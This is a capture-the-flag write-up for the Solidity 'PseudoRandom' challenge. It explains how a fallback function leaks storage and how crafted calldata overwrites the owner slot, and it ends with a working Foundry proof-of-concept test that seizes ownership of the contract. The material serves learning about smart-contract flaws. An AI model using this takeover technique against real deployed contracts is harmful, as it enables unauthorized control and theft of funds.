# PseudoRandom

## Objective of CTF

Become the Owner of the contract.

## Analysis

The PseudoRandom contract only changes **owner** variable in its fallback function. In order to change the contract owner, we need to obtain the correct value "sig" as "msg.sig" first, which is generated in the **constructor** and then stored somewhere in the contract.

In its fallback function, we notice that we can load any storage location of contract when we call the fallback function with **msg.sig** is "0x3bc5de30".

First we load the correct "sig" value from contract somewhere with **msg.sig** 0x3bc5de30. After we obtain it, we have the right to change the variable "owner". But how to set the contract owner to the target one?

In the following code snippet:

```code=solidity
assembly {
    sstore(owner.slot, calldataload(0x24))
}
```

we know that the owner slot will store the 32 bytes data from the call data provided to the contract function call (ranging from index 37th byte to 68th byte in this case)

:warning: Be careful here, in the assembly block we actually store 32 bytes data in the owner slot. But variable owner is a address type which is a 20 bytes data type. In this situation, the last 20 bytes would be the data stores in the variable owner.

Therefore, the call data provided to the contract function call would consist of the following 4 parts:

- 4 bytes hex string for msg.sig
- arbitrary 32 bytes hex string
- 32 bytes hex string that would be stored in the owner slot
  - a arbitrary 12 bytes hex string (this part would not store in the owner variable)
  - the target address we want to store in the owner variable (20 bytes)

After we provide this call data, the contract owner will be the target address.

## PoC test case

```code=solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PseudoRandom.sol";

contract PseudoRandomTest is Test {
    string private BSC_RPC = "https://rpc.ankr.com/bsc"; // 56
    string private POLY_RPC = "https://rpc.ankr.com/polygon"; // 137
    string private FANTOM_RPC = "https://rpc.ankr.com/fantom"; // 250
    string private ARB_RPC = "https://rpc.ankr.com/arbitrum"; // 42161
    string private OPT_RPC = "https://rpc.ankr.com/optimism"; // 10
    string private GNOSIS_RPC = "https://rpc.ankr.com/gnosis"; // 100

    address private addr;

    function setUp() external {
        vm.createSelectFork(BSC_RPC);
    }

    function test() external {
        string memory rpc = new string(32);
        assembly {
            // network selection
            let _rpc := sload(
                add(mod(xor(number(), timestamp()), 0x06), BSC_RPC.slot)
            )
            mstore(rpc, shr(0x01, and(_rpc, 0xff)))
            mstore(add(rpc, 0x20), and(_rpc, not(0xff)))
        }

        addr = makeAddr(rpc);

        vm.createSelectFork(rpc);

        vm.startPrank(addr, addr);
        address instance = address(new PseudoRandom());

        // the solution
        uint256 location;

        assembly {
            location := add(chainid(), sload(addr.slot))
        }

        // get the correct sig stored in the contract
        (, bytes memory data) = instance.call(abi.encodePacked(hex"3bc5de30", location));
        (, data) = instance.call(abi.encodePacked(hex"3bc5de30", data));

        // the data is a 32 bytes hex string with the correct sig in first 4 bytes
        // then we add a arbitrary 16(= 4 + 12) bytes in front of the target addr
        (, data) = instance.call(abi.encodePacked(data, hex"12341234123412341234123412341234", addr));

        assertEq(PseudoRandom(instance).owner(), addr);
    }
}
```
